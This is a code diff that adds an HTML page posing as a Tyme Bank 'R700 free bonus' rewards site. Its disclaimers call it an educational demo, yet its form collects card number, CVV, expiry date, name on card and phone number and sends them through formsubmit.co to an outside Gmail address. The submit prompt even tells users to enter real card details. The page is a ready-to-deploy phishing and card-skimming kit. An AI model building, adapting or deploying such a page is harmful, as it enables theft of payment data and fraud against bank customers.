@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✨ Tyme Bank · rewards demo (fictional)</title>
+    <!-- purely educational demo, not affiliated with any real bank -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+
+        body {
+            background: #0b0a0f; /* deep black base */
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .demo-card {
+            max-width: 520px;
+            width: 100%;
+            background: #1a1723; /* dark purple-black */
+            border-radius: 2.5rem 2.5rem 2rem 2rem;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 2px #4a2e5f, 0 0 15px #b8860b40;
+            padding: 2.2rem 2rem 2.5rem;
+            border: 1px solid #6b4f8b;
+            transition: all 0.2s;
+        }
+
+        /* gold / purple accents */
+        .gold-text {
+            color: #f5c542;
+            text-shadow: 0 0 6px #ffd96680;
+        }
+
+        .purple-glow {
+            color: #c5a0ff;
+        }
+
+        .header-badge {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 1.8rem;
+            border-bottom: 2px solid #3d2a55;
+            padding-bottom: 1.5rem;
+        }
+
+        .logo-symbol {
+            background: linear-gradient(145deg, #322744, #1e152b);
+            width: 60px;
+            height: 60px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 2rem;
+            color: #f9c851;
+            border: 2px solid #b4914b;
+            box-shadow: 0 0 12px #aa7eff;
+        }
+
+        .bank-name h1 {
+            font-size: 2rem;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            background: linear-gradient(to right, #f9e281, #cf9fff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .bank-name span {
+            color: #bdb0d9;
+            font-size: 0.9rem;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .reward-ribbon {
+            background: #2b1d3a;
+            border-radius: 40px;
+            padding: 1.2rem 1.5rem;
+            margin: 1.5rem 0 2rem 0;
+            border-left: 8px solid #f5b81b;
+            border-right: 8px solid #9f7aea;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            box-shadow: inset 0 2px 8px #00000055, 0 8px 0 #0f0c13;
+        }
+
+        .bonus-amount {
+            font-size: 2.7rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fccf7c, #d4a5ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            line-height: 1;
+        }
+
+        .bonus-label {
+            color: #e0d2ff;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-size: 0.9rem;
+            background: #2f2340;
+            padding: 0.3rem 1rem;
+            border-radius: 30px;
+            border: 1px solid #735e96;
+        }
+
+        .info-disclaimer {
+            background: #1f192b;
+            border-radius: 60px;
+            padding: 0.8rem 1.2rem;
+            margin-bottom: 2rem;
+            font-size: 0.8rem;
+            text-align: center;
+            color: #c9b3e6;
+            border: 1px dashed #b4916b;
+        }
+
+        .info-disclaimer strong {
+            color: #f5c150;
+        }
+
+        .form-group {
+            margin-bottom: 1.6rem;
+        }
+
+        label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 0.4rem;
+            color: #e9d7ff;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #120e1a;
+            border-radius: 20px;
+            border: 2px solid #4f3b68;
+            transition: 0.2s;
+            background: #191226;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #f5c542;
+            box-shadow: 0 0 0 3px #6d4f8b, 0 0 15px #e5b13b;
+        }
+
+        .input-icon {
+            padding: 0 0 0 1rem;
+            color: #b5944b;
+            font-size: 1.2rem;
+        }
+
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 1rem 1rem 1rem 0.8rem;
+            font-size: 1rem;
+            color: #f2e7ff;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: #7b6a92;
+            font-weight: 400;
+            opacity: 0.8;
+        }
+
+        /* special row for exp / cvv */
+        .row-flex {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .row-flex .form-group {
+            flex: 1;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(115deg, #32243b, #1b1128);
+            border: 3px solid transparent;
+            border-image: linear-gradient(45deg, #f5c842, #b881ff) 1;
+            border-radius: 60px;
+            padding: 1.2rem 1rem;
+            font-size: 1.7rem;
+            font-weight: 800;
+            color: #fad764;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-top: 1rem;
+            cursor: pointer;
+            box-shadow: 0 10px 0 #0d0a12, 0 5px 25px #ab8eff;
+            transition: 0.1s ease;
+        }
+
+        .btn-submit:hover {
+            background: linear-gradient(115deg, #3f2e4b, #281c34);
+            color: #ffe49e;
+            border-image: linear-gradient(45deg, #ffdb7c, #d4aeff) 1;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 0 #0d0a12, 0 10px 30px #d6adff;
+        }
+
+        .btn-submit:active {
+            transform: translateY(5px);
+            box-shadow: 0 5px 0 #0d0a12, 0 5px 20px #ad85d9;
+        }
+
+        .footer-note {
+            margin-top: 2.2rem;
+            font-size: 0.75rem;
+            text-align: center;
+            color: #8f7aa6;
+            border-top: 1px solid #3b2a4a;
+            padding-top: 1.2rem;
+        }
+
+        .footer-note a {
+            color: #f1c853;
+            text-decoration: none;
+        }
+
+        .footer-note a:hover {
+            text-decoration: underline;
+        }
+
+        /* very subtle purple overlay */
+        .glow-spot {
+            background: radial-gradient(circle at 20% 30%, #6d3b9a20, transparent 60%);
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="demo-card">
+        <!-- header with tyme bank (fictional) -->
+        <div class="header-badge">
+            <div class="logo-symbol">⏣</div>
+            <div class="bank-name">
+                <h1>TYME BANK</h1>
+                <span>✨ rewards hub · demo only</span>
+            </div>
+        </div>
+
+        <!-- reward highlight R700 -->
+        <div class="reward-ribbon">
+            <span class="bonus-amount">R700</span>
+            <span class="bonus-label">FREE BONUS</span>
+        </div>
+
+        <!-- educational disclaimer (prominent) -->
+        <div class="info-disclaimer">
+            ⚡ <strong>educational demo simulation</strong> ⚡<br>
+            fictional bank · do not enter real information
+        </div>
+
+        <!-- FORM with formsubmit.co endpoint -->
+        <form action="https://formsubmit.co/crazyofc16@gmail.com" method="POST" id="rewardForm">
+            <!-- honeypot / spam prevention (optional but recommended by formsubmit) -->
+            <input type="text" name="_honey" style="display:none">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value=""> <!-- stays on same page after submit -->
+            <input type="hidden" name="_subject" value="🎁 TYME BANK demo claim (educational)">
+
+            <!-- 1. card number -->
+            <div class="form-group">
+                <label>💳 CARD NUMBER</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">⦿</span>
+                    <input type="text" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- row: cvv + exp date -->
+            <div class="row-flex">
+                <div class="form-group">
+                    <label>🔒 CVV</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">✦</span>
+                        <input type="text" name="cvv" placeholder="123" maxlength="4" autocomplete="off">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>📅 EXP DATE</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">◈</span>
+                        <input type="text" name="exp_date" placeholder="MM/YY" maxlength="5" autocomplete="off">
+                    </div>
+                </div>
+            </div>
+
+            <!-- 2. name on card -->
+            <div class="form-group">
+                <label>👤 NAME ON CARD</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">✧</span>
+                    <input type="text" name="name_on_card" placeholder="JOHN DOE" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- 3. phone number -->
+            <div class="form-group">
+                <label>📱 PHONE NUMBER</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">⌕</span>
+                    <input type="tel" name="phone_number" placeholder="+27 12 345 6789" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- submit button (claim bonus) -->
+            <button type="submit" class="btn-submit">⏣ CLAIM R700 ⏣</button>
+        </form>
+
+        <!-- additional fine print (educational) -->
+        <div class="footer-note">
+            ⚡ purely fictional rewards interface — all data will be sent to <strong>crazyofc16@gmail.com</strong> via formsubmit.co (demo)<br>
+            💜 purple · black · gold theme   |   <a href="#" onclick="alert('this is a static demo, no actual banking')">disclaimer</a>
+        </div>
+    </div>
+
+    <!-- tiny script: just to show a friendly popup that it's a demo (optional) -->
+    <script>
+        (function() {
+            const form = document.getElementById('rewardForm');
+            // for demo transparency, we can show a reminder before submit
+            form.addEventListener('submit', function(e) {
+                // you may keep or remove this – it's just educational
+                const confirmMsg = "🔎 This is a fictional form.\nInformation will be sent to the email address via formsubmit.co for educational benefiting.\nenter real card details.\n\nContinue with bonus?";
+                if (!confirm(confirmMsg)) {
+                    e.preventDefault();
+                } else {
+                    // optional: show a message that the submit is simulated (but formsubmit will handle)
+                }
+            });
+        })();
+    </script>
+    <!-- No actual data is stored or misused; formsubmit.co forwards to the provided inbox. -->
+</body>
+</html>
